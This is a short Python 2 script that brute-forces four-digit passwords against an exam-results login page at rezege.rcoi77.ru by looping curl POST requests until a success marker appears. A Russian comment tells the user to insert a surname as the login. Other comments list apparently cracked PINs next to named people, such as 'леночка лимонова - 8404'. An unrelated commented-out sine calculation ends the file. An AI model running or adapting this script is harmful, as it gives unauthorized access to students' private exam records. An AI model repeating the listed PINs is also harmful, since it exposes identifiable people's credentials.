import commands;
import time;
i=0;
x='';
while not('+' in x):
	print i;
	if ('отсу' in x):
		i+=1;
		sleep(0.5)
	x=commands.getoutput('curl -d "subj=rus&login=USERNAME&passwd='+str(i/1000)+str(i/100%10)+str(i/10%10)+str(i%10)+'" rezege.rcoi77.ru/ege.pl')
#Вместо USERNAME вставить фамилию

#м - 5237
#леночка лимонова - 8404
#Юля - 9823

#while (x<1000):
#	x+=0.000001;
#	nx=sin(x)+sin(1.5*x);
#	if (pr<nw)&(nx<nw):
#		s+=(nw*nw);
#		n+=1;
#		print((s/n)**0.5,x-0.000001);
#	pr=nw;
#	nw=nx;
